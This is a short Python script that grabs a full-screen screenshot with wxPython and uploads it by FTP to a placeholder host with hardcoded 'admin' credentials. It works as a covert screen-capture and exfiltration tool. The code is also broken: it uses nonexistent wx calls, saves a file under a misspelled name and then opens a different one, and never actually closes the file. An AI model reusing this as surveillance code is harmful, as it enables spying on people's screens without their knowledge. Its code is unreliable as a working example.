import wx, os, ftplib

w = wx.App()
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wx.Bitmap(size[0], size [1])
memo = wx.Memory(bmap)
memo.blit(0, 0, size[0], size[1], screen, 0, 0)

del memo
bmap.SaveFile("grapped.png", wx.BITMAP_TYPE_PNG)

session = ftplib.FTP("192.168.x.y", "admin", "admin")
file = open("grabbed.png", "rb")
session.storbinary("STOR /tmp/grabbed.png", file)

file.close
session.quit()